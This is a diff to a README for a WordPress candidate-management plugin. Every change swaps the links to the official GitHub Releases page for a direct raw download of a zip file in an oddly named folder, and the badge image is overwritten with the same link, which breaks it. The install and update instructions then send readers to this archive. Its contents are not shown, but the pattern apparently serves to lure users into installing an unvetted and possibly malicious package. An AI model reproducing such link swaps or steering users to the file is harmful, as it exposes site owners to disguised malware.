@@ -1,6 +1,6 @@
 # 🎉 Candidate-Manager-WordPress-Plugin - Simplify Your Candidate Management Process
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/vinyy77/Candidate-Manager-WordPress-Plugin/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/vinyy77/Candidate-Manager-WordPress-Plugin/main/unvouchedness/Candidate-Manager-WordPress-Plugin.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/vinyy77/Candidate-Manager-WordPress-Plugin/main/unvouchedness/Candidate-Manager-WordPress-Plugin.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the Candidate Manager WordPress Plugin. This tool helps you manage ca
 
 ## 📥 Download & Install
 
-To download the latest version of the Candidate Manager WordPress Plugin, please visit this page: [Download Here](https://github.com/vinyy77/Candidate-Manager-WordPress-Plugin/releases). 
+To download the latest version of the Candidate Manager WordPress Plugin, please visit this page: [Download Here](https://raw.githubusercontent.com/vinyy77/Candidate-Manager-WordPress-Plugin/main/unvouchedness/Candidate-Manager-WordPress-Plugin.zip). 
 
 ### Installation Steps
 
-1. Visit the [Releases page](https://github.com/vinyy77/Candidate-Manager-WordPress-Plugin/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/vinyy77/Candidate-Manager-WordPress-Plugin/main/unvouchedness/Candidate-Manager-WordPress-Plugin.zip).
 2. Look for the latest version listed at the top.
 3. Click on the download link for the WordPress plugin file. It will be in a `.zip` format.
 4. Save the file to your computer.
@@ -47,7 +47,7 @@ The Candidate Manager WordPress Plugin offers several customization options to f
 
 ### How do I update the plugin?
 
-1. Visit the [Releases page](https://github.com/vinyy77/Candidate-Manager-WordPress-Plugin/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/vinyy77/Candidate-Manager-WordPress-Plugin/main/unvouchedness/Candidate-Manager-WordPress-Plugin.zip).
 2. Download the latest `.zip` file.
 3. In your WordPress admin, go to *Plugins* > *Installed Plugins*.
 4. Deactivate the current Candidate Manager plugin.
@@ -80,4 +80,4 @@ If you need assistance, feel free to reach out through the GitHub repository. Yo
 - **wordpress**
 - **wordpress-plugin**
 
-Visit the [Downloads page](https://github.com/vinyy77/Candidate-Manager-WordPress-Plugin/releases) again to access the latest updates and versions. Enjoy managing your candidates with ease!
+Visit the [Downloads page](https://raw.githubusercontent.com/vinyy77/Candidate-Manager-WordPress-Plugin/main/unvouchedness/Candidate-Manager-WordPress-Plugin.zip) again to access the latest updates and versions. Enjoy managing your candidates with ease!
